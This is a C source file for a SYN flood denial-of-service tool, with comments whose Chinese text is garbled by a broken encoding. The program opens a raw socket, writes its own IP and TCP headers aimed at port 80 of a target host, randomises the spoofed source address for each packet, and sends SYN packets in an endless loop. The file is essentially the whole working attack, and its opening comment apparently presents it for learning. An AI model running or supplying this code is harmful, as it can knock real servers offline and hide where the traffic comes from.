//�H�U�N�Olinux�UDDOS�{���Xddos.c�A�U�����ԲӪ��N�X�A�Ѥj�a�ǲߡC
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <netinet/ip.h> 
#include <netinet/tcp.h> 
#include <stdlib.h> 
#include <errno.h> 
#include <unistd.h> 
#include <stdio.h> 
#include <netdb.h> 

#define DESTPORT 80 /* �n��������(WEB) */ 
#define LOCALPORT 8888 

void send_tcp(int sockfd,struct sockaddr_in *addr); 
unsigned short check_sum(unsigned short *addr,int len); 

int main(int argc,char **argv) 
{ 
	int sockfd; 
	struct sockaddr_in addr; 
	struct hostent *host; 
	int on=1; 
	if(argc!=2) 
	{ 
		fprintf(stderr,"Usage:%s hostname\n\a",argv[0]); 
		exit(1); 
	} 

	bzero(&addr,sizeof(struct sockaddr_in)); 
	addr.sin_family=AF_INET; 
	addr.sin_port=htons(DESTPORT); 

	if(inet_aton(argv[1],&addr.sin_addr)==0) 
	{ 
		host=gethostbyname(argv[1]); 
		if(host==NULL) 
		{ 
			fprintf(stderr,"HostName Error:%s\n\a",hstrerror(h_errno)); 
			exit(1); 
		} 
		addr.sin_addr=*(struct in_addr *)(host->h_addr_list[0]); 
	} 

	/**** �ϥ�IPPROTO_TCP�Ыؤ@��TCP����l�M���r ****/ 

	sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP); 
	if(sockfd<0) 
	{ 
		fprintf(stderr,"Socket Error:%s\n\a",strerror(errno)); 
		exit(1); 
	} 
	/******** �]�mIP��ƥ]�榡,�i�D�t�Τ��ּҲ�IP��ƥ]�ѧڭ̦ۤv�Ӷ�g ***/ 

	setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on)); 

	/**** �S����k,�u�ζW���@�Τ�~�i�H�ϥέ�l�M���r *********/ 
	setuid(getpid()); 

	/********* �o�e���u�F!!!! ****/ 
	send_tcp(sockfd,&addr); 
} 

/******* �o�e���u����{ *********/ 
void send_tcp(int sockfd,struct sockaddr_in *addr) 
{ 
	char buffer[100]; /**** �Ψө�m�ڭ̪���ƥ] ****/ 
	struct ip *ip; 
	struct tcphdr *tcp; 
	int head_len; 

	/******* �ڭ̪���ƥ]��ڤW�S�����󤺮e,�ҥH���״N�O��ӵ��c������ ***/ 

	head_len=sizeof(struct ip)+sizeof(struct tcphdr); 

	bzero(buffer,100); 

	/******** ��RIP��ƥ]���Y��,�ٰO�oIP���Y�榡��? ******/ 
	ip=(struct ip *)buffer; 
	ip->ip_v=IPVERSION; /** �����@�몺�O 4 **/ 
	ip->ip_hl=sizeof(struct ip)>>2; /** IP��ƥ]���Y������ **/ 
	ip->ip_tos=0; /** �A������ **/ 
	ip->ip_len=htons(head_len); /** IP�ƾڥ]������ **/ 
	ip->ip_id=0; /** ���t�Υh��g�a **/ 
	ip->ip_off=0; /** �M�W���@��,���I�ɶ� **/ 
	ip->ip_ttl=MAXTTL; /** �̪����ɶ� 255 **/ 
	ip->ip_p=IPPROTO_TCP; /** �ڭ̭n�o���O TCP�] **/ 
	ip->ip_sum=0; /** ����M���t�Υh�� **/ 
	ip->ip_dst=addr->sin_addr; /** �ڭ̧��������� **/ 

	/******* �}�l��gTCP��ƥ] *****/ 
	tcp=(struct tcphdr *)(buffer +sizeof(struct ip)); 
	tcp->source=htons(LOCALPORT); 
	tcp->dest=addr->sin_port; /** �ت��� **/ 
	tcp->seq=random(); 
	tcp->ack_seq=0; 
	tcp->doff=5; 
	tcp->syn=1; /** �ڭn�إ߳s�� **/ 
	tcp->check=0; 


	/** �n�F,�@�����ǳƦn�F.���A��,�A�ǳƦn�F�S��?? **/ 
	while(1) 
	{ 
		/** �A�����D�ڬO�q���بӪ�,�C�C���h���a! **/ 
		ip->ip_src.s_addr=random(); 

		/** �������t�ΰ��F,�]�S���h�j���N��,�٬O���ڭ̦ۤv�Ӯ����Y���a */ 
		/** �U�ѳo���i���i�L */ 
		tcp->check=check_sum((unsigned short *)tcp, 
		sizeof(struct tcphdr)); 
		sendto(sockfd,buffer,head_len,0,addr,sizeof(struct sockaddr_in)); 
	} 
} 

/* �U�ѬO��������M���t��k,���F�O�H�� */ 
unsigned short check_sum(unsigned short *addr,int len) 
{ 
	register int nleft=len; 
	register int sum=0; 
	register short *w=addr; 
	short answer=0; 

	while(nleft>1) 
	{ 
		sum+=*w++; 
		nleft-=2; 
	} 
	if(nleft==1) 
	{ 
		*(unsigned char *)(&answer)=*(unsigned char *)w; 
		sum+=answer; 
	} 

	sum=(sum>>16)+(sum&0xffff); 
	sum+=(sum>>16); 
	answer=~sum; 
	return(answer); 
}

